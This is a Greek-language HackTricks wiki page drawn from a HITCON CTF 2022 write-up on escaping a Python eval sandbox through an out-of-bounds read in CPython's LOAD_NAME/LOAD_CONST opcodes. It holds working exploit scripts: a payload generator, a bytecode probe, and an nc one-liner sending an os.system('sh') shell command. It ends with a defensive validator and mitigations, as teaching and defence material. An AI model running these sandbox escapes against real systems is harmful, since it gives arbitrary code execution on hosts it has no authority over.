# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

**Αυτές οι πληροφορίες ελήφθησαν** [**από αυτή τη συγγραφή**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Μπορούμε να χρησιμοποιήσουμε τη δυνατότητα OOB read στον opcode LOAD_NAME / LOAD_CONST για να αποκτήσουμε κάποιο σύμβολο στη μνήμη. Αυτό σημαίνει ότι χρησιμοποιούμε κόλπα όπως `(a, b, c, ... εκατοντάδες σύμβολα ..., __getattribute__) if [] else [].__getattribute__(...)` για να αποκτήσουμε ένα σύμβολο (όπως το όνομα μιας συνάρτησης) που θέλουμε.

Απλά κατασκευάστε την εκμετάλλευσή σας.

### Overview <a href="#overview-1" id="overview-1"></a>

Ο πηγαίος κώδικας είναι αρκετά σύντομος, περιέχει μόνο 4 γραμμές!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Μπορείτε να εισάγετε αυθαίρεο Python κώδικα, και θα μεταγλωττιστεί σε ένα [Python code object](https://docs.python.org/3/c-api/code.html). Ωστόσο, το `co_consts` και το `co_names` αυτού του code object θα αντικατασταθούν με ένα κενό tuple πριν την εκτίμηση αυτού του code object.

Έτσι, με αυτόν τον τρόπο, όλες οι εκφράσεις που περιέχουν σταθερές (π.χ. αριθμούς, συμβολοσειρές κ.λπ.) ή ονόματα (π.χ. μεταβλητές, συναρτήσεις) μπορεί να προκαλέσουν σφάλμα τμηματοποίησης στο τέλος.

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Πώς συμβαίνει το segfault;

Ας ξεκινήσουμε με ένα απλό παράδειγμα, `[a, b, c]` θα μπορούσε να μεταγλωττιστεί στον παρακάτω bytecode.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Αλλά τι γίνεται αν το `co_names` γίνει κενό tuple; Ο opcode `LOAD_NAME 2` εκτελείται ακόμα και προσπαθεί να διαβάσει την τιμή από τη μνήμη που αρχικά θα έπρεπε να είναι. Ναι, αυτό είναι ένα χαρακτηριστικό ανάγνωσης εκτός ορίων.

Η βασική έννοια για τη λύση είναι απλή. Ορισμένοι opcodes στην CPython, για παράδειγμα `LOAD_NAME` και `LOAD_CONST`, είναι ευάλωτοι (?) σε ανάγνωση εκτός ορίων.

Ανακτούν ένα αντικείμενο από τον δείκτη `oparg` από το tuple `consts` ή `names` (αυτό είναι που ονομάζονται `co_consts` και `co_names` κάτω από την επιφάνεια). Μπορούμε να αναφερθούμε στο παρακάτω σύντομο απόσπασμα σχετικά με το `LOAD_CONST` για να δούμε τι κάνει η CPython όταν επεξεργάζεται τον opcode `LOAD_CONST`.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
Με αυτόν τον τρόπο μπορούμε να χρησιμοποιήσουμε τη δυνατότητα OOB για να αποκτήσουμε ένα "όνομα" από αυθαίρετη διεύθυνση μνήμης. Για να βεβαιωθούμε ποιο όνομα έχει και ποια είναι η διεύθυνσή του, απλώς συνεχίστε να δοκιμάζετε `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... Και θα μπορούσατε να βρείτε κάτι γύρω από oparg > 700. Μπορείτε επίσης να προσπαθήσετε να χρησιμοποιήσετε το gdb για να ρίξετε μια ματιά στη διάταξη της μνήμης φυσικά, αλλά δεν νομίζω ότι θα ήταν πιο εύκολο;

### Generating the Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Μόλις ανακτήσουμε αυτές τις χρήσιμες διευθύνσεις για ονόματα / σταθερές, πώς _ακριβώς_ αποκτούμε ένα όνομα / σταθερά από αυτή τη διεύθυνση και το χρησιμοποιούμε; Εδώ είναι ένα κόλπο για εσάς:\
Ας υποθέσουμε ότι μπορούμε να αποκτήσουμε ένα όνομα `__getattribute__` από τη διεύθυνση 5 (`LOAD_NAME 5`) με `co_names=()`, τότε απλώς κάντε τα εξής:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Παρατηρήστε ότι δεν είναι απαραίτητο να το ονομάσετε ως `__getattribute__`, μπορείτε να το ονομάσετε με κάτι πιο σύντομο ή πιο περίεργο

Μπορείτε να κατανοήσετε τον λόγο πίσω από αυτό απλά βλέποντας τον bytecode του:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Παρατηρήστε ότι το `LOAD_ATTR` ανακτά επίσης το όνομα από το `co_names`. Η Python φορτώνει ονόματα από την ίδια θέση αν το όνομα είναι το ίδιο, οπότε το δεύτερο `__getattribute__` φορτώνεται ακόμα από offset=5. Χρησιμοποιώντας αυτή τη δυνατότητα, μπορούμε να χρησιμοποιήσουμε οποιοδήποτε όνομα μόλις το όνομα είναι στη μνήμη κοντά.

Για τη δημιουργία αριθμών θα πρέπει να είναι απλό:

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

Δεν χρησιμοποίησα σταθερές λόγω του περιορισμού μήκους.

Πρώτα εδώ είναι ένα σενάριο για να βρούμε αυτά τα offsets των ονομάτων.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
Και το παρακάτω είναι για τη δημιουργία του πραγματικού εκμεταλλευτή Python.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Βασικά εκτελεί τα εξής πράγματα, για αυτές τις συμβολοσειρές τις αποκτούμε από τη μέθοδο `__dir__`:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Σημειώσεις έκδοσης και επηρεαζόμενοι opcodes (Python 3.11–3.13)

- Οι opcodes bytecode του CPython εξακολουθούν να ευρετηριάζονται στα tuples `co_consts` και `co_names` με ακέραιους τελεστές. Εάν ένας επιτιθέμενος μπορέσει να αναγκάσει αυτά τα tuples να είναι κενά (ή μικρότερα από το μέγιστο ευρετήριο που χρησιμοποιείται από το bytecode), ο διερμηνέας θα διαβάσει μνήμη εκτός ορίων για αυτό το ευρετήριο, αποδίδοντας έναν αυθαίρετο δείκτη PyObject από κοντινή μνήμη. Σχετικοί opcodes περιλαμβάνουν τουλάχιστον:
- `LOAD_CONST consti` → διαβάζει `co_consts[consti]`.
- `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → διαβάζουν ονόματα από `co_names[...]` (για 3.11+ σημειώστε ότι τα `LOAD_ATTR`/`LOAD_GLOBAL` αποθηκεύουν bits σημαίας στο χαμηλό bit; το πραγματικό ευρετήριο είναι `namei >> 1`). Δείτε τα έγγραφα του disassembler για ακριβή σημασιολογία ανά έκδοση. [Python dis docs].
- Η Python 3.11+ εισήγαγε προσαρμοστικές/inline caches που προσθέτουν κρυφές εγγραφές `CACHE` μεταξύ των εντολών. Αυτό δεν αλλάζει την OOB primitive; σημαίνει μόνο ότι αν κατασκευάσετε χειροκίνητα bytecode, πρέπει να λάβετε υπόψη αυτές τις εγγραφές cache κατά την κατασκευή του `co_code`.

Πρακτική συνέπεια: η τεχνική σε αυτή τη σελίδα συνεχίζει να λειτουργεί σε CPython 3.11, 3.12 και 3.13 όταν μπορείτε να ελέγξετε ένα αντικείμενο κώδικα (π.χ., μέσω `CodeType.replace(...)`) και να μειώσετε τα `co_consts`/`co_names`.

### Γρήγορος σαρωτής για χρήσιμα OOB ευρετήρια (συμβατός με 3.11+/3.12+)

Εάν προτιμάτε να ερευνήσετε ενδιαφέροντα αντικείμενα απευθείας από το bytecode αντί από υψηλού επιπέδου πηγή, μπορείτε να δημιουργήσετε ελάχιστα αντικείμενα κώδικα και να κάνετε brute force ευρετήρια. Ο παρακάτω βοηθός εισάγει αυτόματα inline caches όταν είναι απαραίτητο.
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Σημειώσεις
- Για να ερευνήσετε ονόματα αντί για αυτό, αντικαταστήστε το `LOAD_CONST` με `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` και προσαρμόστε τη χρήση της στοίβας σας αναλόγως.
- Χρησιμοποιήστε `EXTENDED_ARG` ή πολλαπλά bytes του `arg` για να φτάσετε σε δείκτες >255 αν χρειαστεί. Όταν κατασκευάζετε με `dis` όπως παραπάνω, ελέγχετε μόνο το χαμηλό byte; για μεγαλύτερους δείκτες, κατασκευάστε τα ακατέργαστα bytes μόνοι σας ή χωρίστε την επίθεση σε πολλαπλά loads.

### Ελάχιστο πρότυπο RCE μόνο με bytecode (co_consts OOB → builtins → eval/input)

Μόλις έχετε προσδιορίσει έναν δείκτη `co_consts` που επιλύεται στο module builtins, μπορείτε να ανακατασκευάσετε το `eval(input())` χωρίς κανένα `co_names` χειραγωγώντας τη στοίβα:
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
Αυτή η προσέγγιση είναι χρήσιμη σε προκλήσεις που σας δίνουν άμεσο έλεγχο πάνω στο `co_code` ενώ αναγκάζουν το `co_consts=()` και το `co_names=()` (π.χ., BCTF 2024 “awpcode”). Αποφεύγει κόλπα σε επίπεδο πηγαίου κώδικα και διατηρεί το μέγεθος του payload μικρό εκμεταλλευόμενο τις λειτουργίες της στοίβας bytecode και τους κατασκευαστές πλειάδων.

### Αμυντικοί έλεγχοι και μετριασμοί για sandboxes

Εάν γράφετε μια “sandbox” Python που μεταγλωττίζει/αξιολογεί μη αξιόπιστο κώδικα ή χειρίζεται αντικείμενα κώδικα, μην βασίζεστε στο CPython για έλεγχο ορίων στους δείκτες πλειάδων που χρησιμοποιούνται από το bytecode. Αντίθετα, επικυρώστε τα αντικείμενα κώδικα μόνοι σας πριν τα εκτελέσετε.

Πρακτικός επικυρωτής (απορρίπτει OOB πρόσβαση σε co_consts/co_names)
```python
import dis

def max_name_index(code):
max_idx = -1
for ins in dis.get_instructions(code):
if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
namei >>= 1
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname == "LOAD_CONST"] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Πρόσθετες ιδέες μετριασμού
- Μην επιτρέπετε αυθαίρετο `CodeType.replace(...)` σε μη αξιόπιστη είσοδο, ή προσθέστε αυστηρούς δομικούς ελέγχους στο προκύπτον αντικείμενο κώδικα.
- Σκεφτείτε να εκτελείτε μη αξιόπιστο κώδικα σε ξεχωριστή διαδικασία με sandboxing σε επίπεδο OS (seccomp, job objects, containers) αντί να βασίζεστε στη σημασιολογία του CPython.

## Αναφορές

- Το writeup του Splitline για το HITCON CTF 2022 “V O I D” (προέλευση αυτής της τεχνικής και αλυσίδα εκμετάλλευσης υψηλού επιπέδου): https://blog.splitline.tw/hitcon-ctf-2022/
- Έγγραφα disassembler Python (σημασιολογία δεικτών για LOAD_CONST/LOAD_NAME κ.λπ., και 3.11+ `LOAD_ATTR`/`LOAD_GLOBAL` χαμηλά bit flags): https://docs.python.org/3.13/library/dis.html
{{#include ../../../banners/hacktricks-training.md}}
